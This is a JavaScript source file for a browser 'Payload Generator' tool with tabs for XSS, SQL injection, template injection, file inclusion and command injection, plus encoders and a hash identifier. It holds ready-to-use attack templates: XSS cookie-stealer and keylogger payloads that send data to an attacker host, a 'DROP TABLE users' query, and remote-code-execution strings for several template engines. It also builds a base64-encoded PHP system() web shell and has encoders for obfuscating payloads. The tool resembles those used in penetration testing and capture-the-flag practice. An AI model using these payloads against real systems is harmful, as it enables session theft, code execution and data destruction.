/* ==================== PAYLOAD GENERATOR 💣🔧 ==================== */
/* Multi-Purpose Payload Generation & Encoding Tool */

window.PayloadGen = {
    // --- STATE ---
    currentTab: 'xss',
    output: '',

    // --- XSS PAYLOADS ---
    xssTemplates: [
        { name: 'Basic Alert', template: '<script>alert({MSG})</script>' },
        { name: 'IMG Onerror', template: '<img src=x onerror=alert({MSG})>' },
        { name: 'SVG Onload', template: '<svg onload=alert({MSG})>' },
        { name: 'Body Onload', template: '<body onload=alert({MSG})>' },
        { name: 'Input Autofocus', template: '<input onfocus=alert({MSG}) autofocus>' },
        { name: 'Iframe Src', template: '<iframe src="javascript:alert({MSG})">' },
        { name: 'Details Open', template: '<details open ontoggle=alert({MSG})>' },
        { name: 'Marquee', template: '<marquee onstart=alert({MSG})>' },
        { name: 'Cookie Stealer', template: '<script>new Image().src="http://{ATTACKER}/steal?c="+document.cookie</script>' },
        { name: 'Keylogger', template: '<script>document.onkeypress=function(e){new Image().src="http://{ATTACKER}/log?k="+e.key}</script>' }
    ],

    // --- SQLI PAYLOADS ---
    sqliTemplates: [
        { name: 'Basic OR', template: "' OR '1'='1" },
        { name: 'Comment', template: "' OR 1=1--" },
        { name: 'Union NULL', template: "' UNION SELECT NULL,NULL,NULL--" },
        { name: 'Union Version', template: "' UNION SELECT @@version,NULL,NULL--" },
        { name: 'Time Based', template: "' AND SLEEP({SECONDS})--" },
        { name: 'Error Based', template: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
        { name: 'Stacked Query', template: "'; DROP TABLE users--" },
        { name: 'Boolean Blind', template: "' AND 1=1--" }
    ],

    // --- SSTI PAYLOADS ---
    sstiTemplates: [
        { name: 'Jinja2 Basic', template: '{{7*7}}' },
        { name: 'Jinja2 Config', template: '{{config}}' },
        { name: 'Jinja2 RCE', template: "{{request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read()}}" },
        { name: 'Twig', template: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("{CMD}")}}' },
        { name: 'Freemarker', template: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{CMD}")}' },
        { name: 'Velocity', template: '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("{CMD}")' },
        { name: 'Smarty', template: '{php}echo `{CMD}`;{/php}' },
        { name: 'ERB', template: '<%= system("{CMD}") %>' }
    ],

    // --- LFI/RFI PAYLOADS ---
    lfiTemplates: [
        { name: 'Basic Traversal', template: '../../../etc/passwd' },
        { name: 'Null Byte', template: '../../../etc/passwd%00' },
        { name: 'Double Encode', template: '..%252f..%252f..%252fetc/passwd' },
        { name: 'PHP Wrapper', template: 'php://filter/convert.base64-encode/resource={FILE}' },
        { name: 'Data Wrapper', template: 'data://text/plain;base64,{BASE64_PAYLOAD}' },
        { name: 'Expect Wrapper', template: 'expect://{CMD}' },
        { name: 'Input Wrapper', template: 'php://input' },
        { name: 'Log Poisoning', template: '/var/log/apache2/access.log' }
    ],

    // --- COMMAND INJECTION ---
    cmdTemplates: [
        { name: 'Semicolon', template: '; {CMD}' },
        { name: 'Pipe', template: '| {CMD}' },
        { name: 'AND', template: '&& {CMD}' },
        { name: 'OR', template: '|| {CMD}' },
        { name: 'Backtick', template: '`{CMD}`' },
        { name: 'Subshell', template: '$({CMD})' },
        { name: 'Newline', template: '%0a{CMD}' },
        { name: 'Background', template: '& {CMD} &' }
    ],

    // --- ENCODINGS ---
    encodings: {
        url: (s) => encodeURIComponent(s),
        doubleUrl: (s) => encodeURIComponent(encodeURIComponent(s)),
        html: (s) => s.split('').map(c => '&#' + c.charCodeAt(0) + ';').join(''),
        htmlHex: (s) => s.split('').map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join(''),
        base64: (s) => btoa(s),
        hex: (s) => s.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
        unicode: (s) => s.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''),
        octal: (s) => s.split('').map(c => '\\' + c.charCodeAt(0).toString(8)).join('')
    },

    // --- RENDER ---
    render() {
        return `
            <div class="payload-app fade-in">
                <div class="payload-header">
                    <h1><i class="fas fa-bomb"></i> Payload Generator</h1>
                    <p class="subtitle">Generate, Encode & Obfuscate Payloads</p>
                </div>

                <div class="payload-tabs">
                    <div class="tab ${this.currentTab === 'xss' ? 'active' : ''}" onclick="PayloadGen.switchTab('xss')">XSS</div>
                    <div class="tab ${this.currentTab === 'sqli' ? 'active' : ''}" onclick="PayloadGen.switchTab('sqli')">SQLi</div>
                    <div class="tab ${this.currentTab === 'ssti' ? 'active' : ''}" onclick="PayloadGen.switchTab('ssti')">SSTI</div>
                    <div class="tab ${this.currentTab === 'lfi' ? 'active' : ''}" onclick="PayloadGen.switchTab('lfi')">LFI</div>
                    <div class="tab ${this.currentTab === 'cmd' ? 'active' : ''}" onclick="PayloadGen.switchTab('cmd')">CMD</div>
                    <div class="tab ${this.currentTab === 'encoder' ? 'active' : ''}" onclick="PayloadGen.switchTab('encoder')">Encoder</div>
                    <div class="tab ${this.currentTab === 'hash' ? 'active' : ''}" onclick="PayloadGen.switchTab('hash')">Hash ID</div>
                </div>

                <div class="payload-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'xss': return this.renderPayloadSection('xss', this.xssTemplates, 'XSS');
            case 'sqli': return this.renderPayloadSection('sqli', this.sqliTemplates, 'SQLi');
            case 'ssti': return this.renderPayloadSection('ssti', this.sstiTemplates, 'SSTI');
            case 'lfi': return this.renderPayloadSection('lfi', this.lfiTemplates, 'LFI');
            case 'cmd': return this.renderPayloadSection('cmd', this.cmdTemplates, 'Command Injection');
            case 'encoder': return this.renderEncoder();
            case 'hash': return this.renderHashIdentifier();
            default: return '';
        }
    },

    renderPayloadSection(type, templates, title) {
        return `
            <div class="gen-section">
                <h2><i class="fas fa-code"></i> ${title} Payload Generator</h2>
                
                <div class="gen-form">
                    <div class="form-row">
                        <label>Template:</label>
                        <select id="template-select" onchange="PayloadGen.updatePreview()">
                            ${templates.map((t, i) => `<option value="${i}">${t.name}</option>`).join('')}
                        </select>
                    </div>
                    ${type === 'xss' ? `
                        <div class="form-row">
                            <label>Message:</label>
                            <input type="text" id="xss-msg" value="1" onkeyup="PayloadGen.updatePreview()">
                        </div>
                        <div class="form-row">
                            <label>Attacker IP:</label>
                            <input type="text" id="attacker-ip" value="10.10.10.10" onkeyup="PayloadGen.updatePreview()">
                        </div>
                    ` : ''}
                    ${type === 'sqli' ? `
                        <div class="form-row">
                            <label>Sleep Seconds:</label>
                            <input type="text" id="sqli-seconds" value="5" onkeyup="PayloadGen.updatePreview()">
                        </div>
                    ` : ''}
                    ${type === 'ssti' || type === 'cmd' ? `
                        <div class="form-row">
                            <label>Command:</label>
                            <input type="text" id="cmd-input" value="id" onkeyup="PayloadGen.updatePreview()">
                        </div>
                    ` : ''}
                    ${type === 'lfi' ? `
                        <div class="form-row">
                            <label>File:</label>
                            <input type="text" id="lfi-file" value="index.php" onkeyup="PayloadGen.updatePreview()">
                        </div>
                    ` : ''}
                    <div class="form-row">
                        <label>Encoding:</label>
                        <select id="encoding-select" onchange="PayloadGen.updatePreview()">
                            <option value="none">None</option>
                            <option value="url">URL Encode</option>
                            <option value="doubleUrl">Double URL</option>
                            <option value="html">HTML Entities</option>
                            <option value="base64">Base64</option>
                            <option value="hex">Hex (\\x)</option>
                            <option value="unicode">Unicode (\\u)</option>
                        </select>
                    </div>
                </div>

                <div class="output-section">
                    <h3>Generated Payload:</h3>
                    <div class="output-box">
                        <code id="payload-output">${this.generatePayload(type, templates)}</code>
                        <button onclick="PayloadGen.copyOutput()"><i class="fas fa-copy"></i></button>
                    </div>
                </div>

                <div class="templates-list">
                    <h3>All Templates:</h3>
                    <div class="templates-grid">
                        ${templates.map(t => `
                            <div class="template-card">
                                <span class="template-name">${t.name}</span>
                                <code>${this.escapeHtml(t.template)}</code>
                                <button onclick="navigator.clipboard.writeText(\`${t.template.replace(/`/g, '\\`')}\`)"><i class="fas fa-copy"></i></button>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>
        `;
    },

    renderEncoder() {
        return `
            <div class="encoder-section">
                <h2><i class="fas fa-exchange-alt"></i> Multi-Encoder</h2>
                
                <div class="encoder-input">
                    <textarea id="encoder-input" placeholder="Enter text to encode..." onkeyup="PayloadGen.encodeAll()"></textarea>
                </div>

                <div class="encoder-outputs">
                    ${Object.keys(this.encodings).map(enc => `
                        <div class="encoder-row">
                            <span class="enc-name">${enc}</span>
                            <code id="enc-${enc}"></code>
                            <button onclick="PayloadGen.copyEnc('${enc}')"><i class="fas fa-copy"></i></button>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderHashIdentifier() {
        return `
            <div class="hash-section">
                <h2><i class="fas fa-fingerprint"></i> Hash Identifier</h2>
                
                <div class="hash-input">
                    <input type="text" id="hash-input" placeholder="Enter hash to identify..." onkeyup="PayloadGen.identifyHash()">
                    <button onclick="PayloadGen.identifyHash()"><i class="fas fa-search"></i> Identify</button>
                </div>

                <div id="hash-result" class="hash-result"></div>

                <div class="hash-reference">
                    <h3>Common Hash Types:</h3>
                    <div class="hash-grid">
                        <div class="hash-type"><span>MD5</span><code>32 hex chars</code></div>
                        <div class="hash-type"><span>SHA1</span><code>40 hex chars</code></div>
                        <div class="hash-type"><span>SHA256</span><code>64 hex chars</code></div>
                        <div class="hash-type"><span>SHA512</span><code>128 hex chars</code></div>
                        <div class="hash-type"><span>NTLM</span><code>32 hex chars</code></div>
                        <div class="hash-type"><span>bcrypt</span><code>$2[aby]$...</code></div>
                        <div class="hash-type"><span>MySQL5</span><code>*40 hex chars</code></div>
                        <div class="hash-type"><span>SHA512crypt</span><code>$6$...</code></div>
                    </div>
                </div>
            </div>
        `;
    },

    // --- ACTIONS ---
    switchTab(tab) {
        this.currentTab = tab;
        this.reRender();
    },

    generatePayload(type, templates) {
        const templateIndex = 0;
        let payload = templates[templateIndex].template;

        payload = payload.replace('{MSG}', '1');
        payload = payload.replace('{ATTACKER}', '10.10.10.10');
        payload = payload.replace('{CMD}', 'id');
        payload = payload.replace('{SECONDS}', '5');
        payload = payload.replace('{FILE}', 'index.php');

        return this.escapeHtml(payload);
    },

    updatePreview() {
        const templateIndex = parseInt(document.getElementById('template-select')?.value || 0);
        const encoding = document.getElementById('encoding-select')?.value || 'none';

        let templates;
        switch (this.currentTab) {
            case 'xss': templates = this.xssTemplates; break;
            case 'sqli': templates = this.sqliTemplates; break;
            case 'ssti': templates = this.sstiTemplates; break;
            case 'lfi': templates = this.lfiTemplates; break;
            case 'cmd': templates = this.cmdTemplates; break;
            default: return;
        }

        let payload = templates[templateIndex].template;

        // Replace placeholders
        const msg = document.getElementById('xss-msg')?.value || '1';
        const attacker = document.getElementById('attacker-ip')?.value || '10.10.10.10';
        const cmd = document.getElementById('cmd-input')?.value || 'id';
        const seconds = document.getElementById('sqli-seconds')?.value || '5';
        const file = document.getElementById('lfi-file')?.value || 'index.php';

        payload = payload.replace('{MSG}', msg);
        payload = payload.replace('{ATTACKER}', attacker);
        payload = payload.replace('{CMD}', cmd);
        payload = payload.replace('{SECONDS}', seconds);
        payload = payload.replace('{FILE}', file);
        payload = payload.replace('{BASE64_PAYLOAD}', btoa('<?php system("' + cmd + '"); ?>'));

        // Apply encoding
        if (encoding !== 'none' && this.encodings[encoding]) {
            payload = this.encodings[encoding](payload);
        }

        this.output = payload;
        document.getElementById('payload-output').textContent = payload;
    },

    encodeAll() {
        const input = document.getElementById('encoder-input')?.value || '';
        Object.keys(this.encodings).forEach(enc => {
            const el = document.getElementById('enc-' + enc);
            if (el) el.textContent = this.encodings[enc](input);
        });
    },

    copyOutput() {
        navigator.clipboard.writeText(this.output || document.getElementById('payload-output')?.textContent || '');
    },

    copyEnc(enc) {
        const text = document.getElementById('enc-' + enc)?.textContent || '';
        navigator.clipboard.writeText(text);
    },

    identifyHash() {
        const hash = document.getElementById('hash-input')?.value.trim() || '';
        const result = document.getElementById('hash-result');
        if (!hash) { result.innerHTML = ''; return; }

        const hashTypes = [];
        const len = hash.length;

        // Check patterns
        if (/^[a-f0-9]{32}$/i.test(hash)) hashTypes.push('MD5', 'NTLM', 'MD4');
        if (/^[a-f0-9]{40}$/i.test(hash)) hashTypes.push('SHA1', 'MySQL5');
        if (/^[a-f0-9]{64}$/i.test(hash)) hashTypes.push('SHA256', 'SHA3-256');
        if (/^[a-f0-9]{128}$/i.test(hash)) hashTypes.push('SHA512', 'SHA3-512');
        if (/^\$2[aby]\$\d+\$/.test(hash)) hashTypes.push('bcrypt');
        if (/^\$6\$/.test(hash)) hashTypes.push('SHA512crypt');
        if (/^\$5\$/.test(hash)) hashTypes.push('SHA256crypt');
        if (/^\$1\$/.test(hash)) hashTypes.push('MD5crypt');
        if (/^\*[A-Fa-f0-9]{40}$/.test(hash)) hashTypes.push('MySQL5');
        if (/^[a-f0-9]{16}$/i.test(hash)) hashTypes.push('MySQL323', 'DES');

        if (hashTypes.length > 0) {
            result.innerHTML = `<div class="hash-match"><h4>Possible Types:</h4><ul>${hashTypes.map(t => `<li>${t}</li>`).join('')}</ul></div>`;
        } else {
            result.innerHTML = '<div class="hash-nomatch">Unknown hash format (length: ' + len + ')</div>';
        }
    },

    escapeHtml(str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    },

    reRender() {
        const app = document.querySelector('.payload-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .payload-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .payload-header h1 { margin: 0; color: #f59e0b; font-size: 1.8rem; }
            .payload-header .subtitle { color: #888; margin: 5px 0 20px; }

            .payload-tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; }
            .tab { padding: 10px 18px; border-radius: 8px; cursor: pointer; transition: 0.2s; color: #888; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #f59e0b; color: #000; }

            .gen-section h2 { color: #f59e0b; margin: 0 0 20px; }
            .gen-form { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; margin-bottom: 20px; }
            .form-row { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
            .form-row:last-child { margin-bottom: 0; }
            .form-row label { min-width: 120px; color: #888; }
            .form-row input, .form-row select { flex: 1; padding: 10px; background: #0a0a12; border: 1px solid #333; border-radius: 8px; color: #fff; }

            .output-section { margin-bottom: 25px; }
            .output-section h3 { color: #f59e0b; margin: 0 0 10px; }
            .output-box { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 15px; border-radius: 10px; border: 1px solid #f59e0b; }
            .output-box code { flex: 1; color: #2ecc71; font-family: monospace; word-break: break-all; }
            .output-box button { background: #f59e0b; border: none; padding: 8px 15px; border-radius: 6px; color: #000; cursor: pointer; }

            .templates-list h3 { color: #f59e0b; margin: 0 0 15px; }
            .templates-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 10px; }
            .template-card { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; }
            .template-name { color: #f59e0b; min-width: 120px; }
            .template-card code { flex: 1; color: #2ecc71; font-size: 0.85rem; word-break: break-all; }
            .template-card button { background: none; border: none; color: #666; cursor: pointer; }

            .encoder-section h2 { color: #f59e0b; margin: 0 0 20px; }
            .encoder-input textarea { width: 100%; height: 100px; background: #0a0a12; border: 1px solid #333; border-radius: 10px; padding: 15px; color: #fff; margin-bottom: 20px; }
            .encoder-outputs { display: flex; flex-direction: column; gap: 10px; }
            .encoder-row { display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.3); padding: 12px 15px; border-radius: 8px; }
            .enc-name { min-width: 100px; color: #f59e0b; font-weight: 500; }
            .encoder-row code { flex: 1; color: #2ecc71; font-size: 0.85rem; word-break: break-all; min-height: 20px; }
            .encoder-row button { background: none; border: none; color: #666; cursor: pointer; }

            .hash-section h2 { color: #f59e0b; margin: 0 0 20px; }
            .hash-input { display: flex; gap: 10px; margin-bottom: 20px; }
            .hash-input input { flex: 1; padding: 12px; background: #0a0a12; border: 1px solid #333; border-radius: 8px; color: #fff; font-family: monospace; }
            .hash-input button { padding: 12px 20px; background: #f59e0b; border: none; border-radius: 8px; color: #000; cursor: pointer; }
            .hash-result { margin-bottom: 25px; }
            .hash-match { background: rgba(34,197,94,0.1); border: 1px solid #22c55e; padding: 15px; border-radius: 10px; }
            .hash-match h4 { color: #22c55e; margin: 0 0 10px; }
            .hash-match ul { margin: 0; padding-left: 20px; color: #2ecc71; }
            .hash-nomatch { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; padding: 15px; border-radius: 10px; color: #ef4444; }
            .hash-reference h3 { color: #f59e0b; margin: 0 0 15px; }
            .hash-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; }
            .hash-type { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; display: flex; justify-content: space-between; }
            .hash-type span { color: #fff; }
            .hash-type code { color: #888; font-size: 0.8rem; }

            @media (max-width: 800px) { .templates-grid { grid-template-columns: 1fr; } }
        </style>`;
    }
};

function pagePayloadGen() {
    return PayloadGen.render();
}
